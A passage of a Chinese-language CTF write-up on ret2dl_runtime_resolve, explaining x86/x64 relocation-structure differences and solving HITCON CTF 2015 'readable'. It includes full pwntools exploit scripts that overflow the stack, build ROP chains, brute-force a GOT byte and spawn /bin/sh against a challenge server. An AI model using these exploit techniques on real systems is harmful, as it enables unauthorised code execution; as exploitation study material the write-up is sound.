class="comment"># raw_input('[11] before receive "input slogan:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input slogan:\x00"</span>)</span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p32(PLT0) + p32(reloc_offset) + p32(main_addr) + p32(binsh_str_addr)</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload_len:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload:"</span> + payload[<span class="number">0</span>:<span class="number">0x90</span>] + str_to_hex(payload[<span class="number">0x90</span>:<span class="number">0x94</span>]) + payload[<span class="number">0x94</span>:<span class="number">0x9C</span>] + str_to_hex(payload[<span class="number">0x9C</span>:])</span><br><span class="line">    <span class="comment"># raw_input('[12] before send payload')</span></span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p><h3 id="4-3、x64的情况——HITCON-CTF-2015–readable"><a href="#4-3、x64的情况——HITCON-CTF-2015–readable" class="headerlink" title="4.3、x64的情况——HITCON CTF 2015–readable"></a>4.3、x64的情况——HITCON CTF 2015–readable</h3><h4 id="0、x86情况与x64情况的不同之处"><a href="#0、x86情况与x64情况的不同之处" class="headerlink" title="0、x86情况与x64情况的不同之处"></a>0、x86情况与x64情况的不同之处</h4><p>1、<strong><code>相关结构体大小</code></strong>不同：</p><blockquote><ul><li><strong><code>动态链接重定位表“.rel.plt”</code></strong>：<strong><code>x86情况</code></strong>使用<code>Elf32_Rel</code>，大小为<code>2*4=8字节</code>。<strong><code>x64情况</code></strong>使用<code>Elf64_Rela</code>，大小为<code>3*8=24字节</code>。<strong><code>x86情况</code></strong>的结构体成员<code>r_info</code>中<code>符号表下标</code>和<code>重定位类型</code>分别占用<code>3字节</code>和<code>1字节</code>。<strong><code>x64情况</code></strong>的结构体成员<code>r_info</code>中<code>符号表下标</code>和<code>重定位类型</code>分别占用<code>4字节</code>和<code>4字节</code>。</li><li><strong><code>动态链接符号表“.dynsym”</code></strong>：<strong><code>x86情况</code></strong>使用<code>Elf32_Sym</code>，大小为<code>4*4=16字节</code>。<strong><code>x64情况</code></strong>使用<code>Elf64_Sym</code>，大小为<code>3*8=24字节</code>。<code>x86情况</code>和<code>x64情况</code>结构体成员的顺序不同。</li></ul></blockquote><p>2、<strong><code>reloc_arg含义</code></strong>不同：</p><blockquote><ul><li>1、<strong><code>x86情况</code></strong>: <code>reloc_arg == reloc_offset</code>，含义是所重定位符号的<code>重定位项</code>距离<code>重定位表“.rel.plt”</code>起始位置的<code>偏移</code>。重定位项地址<code>reloc = JMPREL + reloc_offset</code>。</li><li>2、<strong><code>x64情况</code></strong>: <code>reloc_arg == reloc_index</code>，含义是所重定位符号的<code>重定位项</code>在<code>重定位表“.rel.plt”</code>中的<code>下标</code>。重定位项地址<code>reloc = JMPREL + reloc_index*3*8</code>。</li></ul></blockquote><p>3、<strong><code>符号版本表(.gnu.version)</code></strong><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)   </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//获取动态符号版本表“.gnu.version”的地址</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">    <span class="comment">//ndx是当前符号所使用的glibc库版本在版本需要表(.gnu.version_r)中的版本结构体的vna_other成员的值</span></span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>; </span><br><span class="line">    <span class="comment">//l_version数组存储的是版本需要表(.gnu.version_r)中包含的二进制程序实际依赖的glibc库版本结构体指针</span></span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];  <span class="comment">//得到当前所解析符号的glibc库版本信息</span></span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">        version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这段代码取<code>r_info的高位</code>作为<strong><code>符号版本表vernum(.gnu.version)</code></strong>的<code>下标</code>，访问对应的值并赋给<code>ndx</code>，<code>ndx</code>再作为<code>l_versions</code>表的<code>下标</code>，找到对应的值赋给<code>version</code>。<strong><code>ndx</code></strong>是当前符号所使用的<code>glibc库版本</code>在<strong><code>版本需要表(.gnu.version_r)</code></strong>中的<code>版本结构体(Elfxx_Vernaux)</code>的<code>vna_other</code>成员的值。<strong><code>l_versions</code></strong>是结构体<code>r_found_version</code>的数组。<strong><code>version</code></strong>表示的是<strong><code>版本需要表(.gnu.version_r)</code></strong>中包含的<code>此ELF文件</code>实际依赖的<code>glibc库版本结构体(r_found_version)</code>的指针。<br>&emsp;&emsp;<strong><code>64位情况</code></strong>下，我们构造的<code>fake链</code>一般位于<strong><code>bss节</code></strong>(<code>64位</code>下，<code>bss节</code>一般位于<strong><code>0x600000</code></strong>之后)，<strong><code>重定位表“.rela.plt”</code></strong>一般在<strong><code>0x400000</code></strong>左右，所以我们构造的<code>r_info的高位(sym_index)</code>和<code>reloc_arg</code>一般会很大。又因为计算符号项地址<strong><code>&amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]</code></strong>和符号版本项地址<strong><code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code></strong>时，<code>数组的数据类型</code>的大小不同(<strong><code>symtab</code></strong>中的结构体大小为<code>0x18字节</code>，<strong><code>vernum</code></strong>的数据类型为<code>uint16_t</code>，大小为<code>0x2字节</code>)，这就导致<code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code>大概率会访问到<code>0x400000</code>到<code>0x600000</code>之间的<code>不可读区域</code>(64位下，这个区间一般不可读)，使得程序报错。<br>&emsp;&emsp;<strong><code>32位情况</code></strong>下，我们构造的<code>r_info的高位(sym_index)</code>和<code>reloc_arg</code>很小，所以计算<strong><code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code></strong> == <strong><code>vernum + sym_index*2</code></strong>时，不会访问到<code>不可访问</code>的区域。所以我们只要让<code>vernum + sym_index*2</code>访问到的<code>ndx值合理</code>即可。关于<code>ndx的取值范围</code>在我的另一篇文章中有介绍，但也<code>只是猜测</code>。——<code>RCTF2015-WriteUp(Pwn)</code>。</p><p>为了<code>防止</code>出现这个错误，我们有几种方法。</p><blockquote><ul><li><strong><code>方法一：</code></strong>我们需要修改<code>判断流程</code>，使得<strong><code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code></strong>为0，从而绕开这块代码。而<code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code>在<strong><code>64位</code></strong>中的位置就是<code>link_map+0x1c8</code>。对应的，<code>32位</code>下为<code>link_map+0xe4</code>，所以我们需要<code>泄露link_map地址</code>，将其置为0。这种攻击方式依赖<code>源程序</code>自带的<code>输出函数</code>。</li><li><strong><code>方法二：</code></strong>使得<strong><code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code></strong> == <strong><code>vernum + sym_index*2</code></strong>可读，并且读出的<code>ndx值合理</code>。我们可以通过修改<code>.dynamic节</code>中<code>DT_VERSYM动态节类型</code>所对应的<code>动态节表项</code>，使<code>vernum表的地址</code>改变。然后影响<code>vernum + sym_index*2</code>的计算结果，使得到<code>符号版本表项的地址</code>可读，并且此地址处的<code>ndx值合理</code>。<code>ndx的值</code>一般不宜太大，设为<code>0x0000</code>应该是通用的。这种攻击方式依赖<code>源程序</code>自带的<code>输入函数</code>。能够任意地址写。</li></ul></blockquote><h4 id="1、检查程序开启的保护机制-1"><a href="#1、检查程序开启的保护机制-1" class="headerlink" title="1、检查程序开启的保护机制"></a>1、检查程序开启的保护机制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec readable</span><br><span class="line">[*] &apos;/home/******/Desktop/remote-dbg/readable&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>可以看到此程序只开启了<code>NX(堆栈不可执行)</code>。</p><h4 id="2、静态分析-1"><a href="#2、静态分析-1" class="headerlink" title="2、静态分析"></a>2、静态分析</h4><p>IDA反编译后<code>主函数</code>如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h] buf大小只有16byte</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">32u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这道题的<code>漏洞</code>很明显，<code>buf的实际大小</code>只有<code>16byte</code>，但是read()函数却<code>最大可以读取32byte</code>，这就造成了<code>栈溢出</code>，会覆盖<code>rbp</code>和<code>ret_address</code>。通过将<code>ret_address</code>覆盖为<code>main函数的入口地址</code>，从而对漏洞实现<code>多次利用</code>，达到<code>任意地址写</code>的目的。由于只有任意地址<code>写权限</code>，而没有<code>读权限</code>，因此几乎<code>无法泄露信息</code>，利用常规方法则会比较难。</p><h4 id="3、方法一：爆破read-中syscall的偏移，并修改eax为0x3b，调用execve-“-bin-sh”-0-0"><a href="#3、方法一：爆破read-中syscall的偏移，并修改eax为0x3b，调用execve-“-bin-sh”-0-0" class="headerlink" title="3、方法一：爆破read()中syscall的偏移，并修改eax为0x3b，调用execve(“/bin/sh”,0,0)"></a>3、方法一：爆破read()中syscall的偏移，并修改eax为0x3b，调用execve(“/bin/sh”,0,0)</h4><p><strong><code>利用思路：</code></strong></p><ul><li>1、爆破获取<code>read函数</code>中调用<code>syscall的偏移</code>，并将其覆盖到<code>read的GOT表内容</code>的<code>最后一个字节</code>，再将<code>eax</code>修改成<code>0x3b</code>，然后将<code>“/bin/sh”</code>压入栈，并将<code>rdi</code>指向它，同时将<code>rsi</code>和<code>rdx</code>分别设置为<code>0</code>，相当于调用了<strong><code>execve(&quot;/bin/sh&quot;,0,0)</code></strong>，从而实现shell的获取。</li></ul><p>每个<code>系统调用</code>中都有如下的实现：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;read函数</span></span><br><span class="line">&lt;read+n&gt;  <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line">&lt;read+(n+<span class="number">5</span>)&gt; <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;write函数</span></span><br><span class="line">&lt;write+n&gt;   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">&lt;write+(n+<span class="number">5</span>)&gt; <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;execve函数</span></span><br><span class="line">&lt;execve+n&gt;    <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x3b</span></span><br><span class="line">&lt;execve+(n+<span class="number">5</span>)&gt; <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure></p><ul><li>2、如果知道了<code>read函数</code>中<code>syscall</code>距离<code>read函数起始位置</code>的<code>偏移</code>，那么直接将<code>read的GOT表内容</code>的<code>最后一个字节</code>修改为<code>此偏移</code>，同时通过<code>read函数</code>读取<code>系统调用号长度</code>的内容，使<code>eax</code>修改为<code>系统调用号</code>。这样，<code>调用read函数</code>的时候就相当于执行<code>其他系统调用</code>了。<code>爆破syscall偏移</code>的时候利用<code>write函数</code>进行<code>打印测试</code>，如果能够<code>正常打印</code>，则说明爆破出的<code>syscall偏移</code>是<code>正确的</code>，否则程序读取不到相关信息。</li></ul><p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary = <span class="string">'./readable'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x600910</span></span><br><span class="line">buff_addr = bss_addr + <span class="number">0x20</span></span><br><span class="line">main_addr = <span class="number">0x400505</span></span><br><span class="line">head_addr = <span class="number">0x400000</span></span><br><span class="line">set_args_addr = <span class="number">0x40058A</span><span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">call_func_addr = <span class="number">0x400570</span><span class="comment">#__libc_csu_init中的通用gadget</span></span><br><span class="line">read_got = <span class="number">0x6008E8</span></span><br><span class="line">leave_ret = <span class="number">0x400520</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'52.68.53.28'</span>,<span class="number">56746</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">'./readable'</span>)</span><br><span class="line">        <span class="comment"># io = gdb.debug('./readable','bp 0x400579')# get_syscall_dis()</span></span><br><span class="line">        io = gdb.debug(<span class="string">'./readable'</span>,<span class="string">'''bp 0x4004FD</span></span><br><span class="line"><span class="string">                                       bp 0x40051B'''</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_syscall_addr</span><span class="params">(io,dis)</span>:</span></span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p64(set_args_addr)</span><br><span class="line">    <span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    shellcode += p64(<span class="number">0x0</span>) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x0</span>)</span><br><span class="line">    <span class="comment"># rdi = r15 = 0,rsi = r14 = read_got,rdx = r13 = 0x01,call(r12+rbx*8) = call(read_got+0*8)</span></span><br><span class="line">    <span class="comment"># read(0,read_got,1)  rax存储返回值，read()成功,则返回读取的字节数,这将rax设置为了0x01</span></span><br><span class="line">    shellcode += p64(call_func_addr)</span><br><span class="line">    shellcode += <span class="string">'A'</span> * <span class="number">8</span><span class="comment"># 0x400586  add rsp, 8</span></span><br><span class="line">    <span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    shellcode += p64(<span class="number">0x0</span>) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x04</span>) + p64(head_addr) + p64(<span class="number">0x01</span>)</span><br><span class="line">    <span class="comment"># rdi = r15 = 0x01,rsi = r14 = head_addr,rdx = r13 = 0x04,call(r12+rbx*8) = call(read_got+0*8)</span></span><br><span class="line">    <span class="comment"># write(1,head_addr,4),若dis成功将read_got指向syscall，则执行write()</span></span><br><span class="line">    shellcode += p64(call_func_addr)</span><br><span class="line">    length = len(shellcode)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"shellcode length:"</span> + str(length)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        length += <span class="number">16</span> - length % <span class="number">16</span></span><br><span class="line">    payload = shellcode.ljust(length,<span class="string">'\x90'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload length:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length,<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># buf,rbp,ret_address</span></span><br><span class="line">        io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr + <span class="number">0x10</span> + i) + p64(main_addr))</span><br><span class="line">        <span class="comment"># buf,rbp,ret_address</span></span><br><span class="line">        io.send(payload[i:i+<span class="number">16</span>] + p64(bss_addr + <span class="number">0x10</span>) + p64(main_addr))</span><br><span class="line">    io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr - <span class="number">0x08</span>) + p64(leave_ret))</span><br><span class="line">    <span class="comment"># raw_input('before send dis')</span></span><br><span class="line">    io.send(chr(dis))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"dis:"</span>,hex(dis)</span><br><span class="line">    <span class="comment"># raw_input('before receive data')</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = io.recv(<span class="number">4</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">print</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> data]</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">'\x7FELF'</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[*]Find the offset of syscall in read() function :"</span>,hex(dis)</span><br><span class="line">            raw_input()</span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_syscall_dis</span><span class="params">()</span>:</span></span><br><span class="line">    dis = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> dis <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x100</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = get_io()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"-------------------Start-----------------------"</span></span><br><span class="line">            brute_syscall_addr(io,dis)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"--------------------End------------------------\n"</span></span><br><span class="line">        <span class="keyword">except</span> Exception,e:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io,dis)</span>:</span></span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p64(set_args_addr)</span><br><span class="line">    <span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    shellcode += p64(<span class="number">0x0</span>) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x3b</span>) + p64(read_got - <span class="number">0x3b</span> + <span class="number">1</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">    <span class="comment"># rdi = r15 = 0,rsi = r14 = (read_got-0x3a),rdx = r13 = 0x3b,call(r12+rbx*8) = call(read_got+0*8)</span></span><br><span class="line">    <span class="comment"># read(0,read_got-0x3a,3b)  rax存储返回值，read()成功,则返回读取的字节数,这将rax设置为了0x3b</span></span><br><span class="line">    shellcode += p64(call_func_addr)</span><br><span class="line">    shellcode += <span class="string">'A'</span> * <span class="number">8</span><span class="comment"># 0x400586  add rsp, 8</span></span><br><span class="line">    <span class="comment"># rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    shellcode += p64(<span class="number">0x0</span>) + p64(<span class="number">0x01</span>) + p64(read_got) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x0</span>) + p64(bss_addr)</span><br><span class="line">    <span class="comment"># rdi = r15 = bss_addr("/bin/sh"),rsi = r14 = 0,rdx = r13 = 0,call(r12+rbx*8) = call(read_got+0*8)</span></span><br><span class="line">    <span class="comment"># execvl("/bin/sh",0,0)</span></span><br><span class="line">    shellcode += p64(call_func_addr)</span><br><span class="line">    length = len(shellcode)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"shellcode length:"</span> + str(length)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        length += <span class="number">16</span> - length % <span class="number">16</span></span><br><span class="line">    payload = shellcode.ljust(length,<span class="string">'\x90'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload length:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length,<span class="number">16</span>):</span><br><span class="line">        <span class="comment"># 'A'*0x10---RBP---ret_addr  buffer的地址使用RBP-0x10算出，shellcode从0x600930(bss_addr+0x20)开始存储</span></span><br><span class="line">        <span class="comment"># raw_input('---------[%d] Adjust buffer address---------'%i)</span></span><br><span class="line">        io.send(<span class="string">'A'</span>*<span class="number">0x10</span> + p64(buff_addr + <span class="number">0x10</span> + i) + p64(main_addr))</span><br><span class="line">        <span class="comment"># raw_input('-------------[%d] Send payload-------------'%i)</span></span><br><span class="line">        io.send(payload[i:i+<span class="number">16</span>] + p64(bss_addr + <span class="number">0x10</span>) + p64(main_addr)) <span class="comment">#bss节前0x20字节用于调整buffer地址</span></span><br><span class="line">    padding = <span class="string">"/bin/sh"</span>.ljust(<span class="number">0x10</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    <span class="comment"># raw_input('-------------Send "/bin/sh"-------------')</span></span><br><span class="line">    io.send(padding + p64(buff_addr - <span class="number">0x08</span>) + p64(leave_ret))<span class="comment">#发送"/bin/sh",设置rsp指向shellcode,并跳转到shellcode执行</span></span><br><span class="line">    io.send(<span class="string">'A'</span>*(<span class="number">0x3b</span><span class="number">-1</span>) + chr(dis))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># get_syscall_dis()</span></span><br><span class="line">    io = get_io()</span><br><span class="line">    dis = <span class="number">0x1e</span> <span class="comment"># or 0x3b</span></span><br><span class="line">    pwn(io,dis)</span><br></pre></td></tr></table></figure></p><h4 id="4、方法二：使用ret2-dl-runtime-resolve方式进行利用"><a href="#4、方法二：使用ret2-dl-runtime-resolve方式进行利用" class="headerlink" title="4、方法二：使用ret2_dl_runtime_resolve方式进行利用"></a>4、方法二：使用ret2_dl_runtime_resolve方式进行利用</h4><p><strong><code>利用思路：</code></strong></p><ul><li>1、构造<strong><code>fake_reloc_data</code></strong>、<strong><code>fake_sym_data</code></strong>、<strong><code>func_name</code></strong>、<strong><code>binsh_str</code></strong>、<strong><code>shellcode</code></strong>数据，并写入到合适的位置。计算<code>数据写入地址</code>时，需要注意一些情况。一般情况，这些数据都会写入到<code>.bss节之后</code>的位置。<code>x64情况</code>下，在<strong><code>_dl_runtime_resolve()</code></strong>函数和<strong><code>_dl_fixup()</code></strong>函数中，程序会通过<code>rsp</code>保存<code>寄存器数据</code>到栈上和修改<code>栈上的数据</code>，并且<code>范围较大</code>。由于此程序在通过<code>read()函数</code>多次读入数据时，修改了<code>rbp</code>，使得<code>rbp</code>和<code>rsp</code>都指向<code>.bss节之后的地址</code>。我们在进入<strong><code>符号解析函数</code></strong>时，解析函数会<code>减小rsp</code>，用于<code>存储寄存器数据</code>，并且会将<code>栈上的一些数据清零</code>。这会导致<code>.bss节之前节</code>的数据<code>被修改</code>，造成<code>无法解析</code>system函数的地址。所以我们需要在<code>shellcode写入地址前</code>留够一定的空间，供<code>符号解析函数</code>使用。而<code>fake_reloc_data</code>、<code>fake_sym_data</code>、<code>func_name</code>、<code>binsh_str</code>等数据一般写在<code>shellcode之后</code>的位置。</li></ul><p>&emsp;&emsp;下面是<strong><code>_dl_runtime_resolve()</code></strong>函数和<strong><code>_dl_fixup()</code></strong>函数中<code>对rsp和rbp修改</code>，以及<code>利用rsp和rbp</code>修改<code>栈上数据</code>的代码片段：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve():</span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F14 <span class="keyword">and</span>     <span class="built_in">rsp</span>, <span class="number">0FFFFFFFFFFFFFFC0h</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F18 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="built_in">cs</span>:qword_7F3989066D50(<span class="number">0x3C0</span>)</span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F1F <span class="keyword">mov</span>     [<span class="built_in">rsp</span>], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F23 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">8</span>], <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">ld_2.23.so:</span>00007F3988E58F28 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">10h</span>], <span class="built_in">rdx</span></span><br><span class="line"><span 